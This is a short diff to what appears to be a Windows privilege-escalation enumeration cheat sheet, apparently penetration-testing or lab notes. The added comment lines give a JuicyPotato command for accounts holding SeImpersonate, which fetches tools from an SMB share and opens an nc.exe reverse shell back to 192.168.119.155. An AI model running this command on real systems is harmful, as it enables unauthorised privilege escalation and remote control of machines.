@@ -14,6 +14,8 @@ echo %USERNAME%
 whoami /priv
 whoami /groups 
 whoami /all
+# If user has SeImpersonate privs 
+# \\192.168.119.155\test\juicy.exe -l 4444 -p c:\windows\system32\cmd.exe -a "/c  \\192.168.119.155\test\nc.exe -e cmd.exe 192.168.119.155 4447" -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9} 
 
 net user  
 net localgroup  
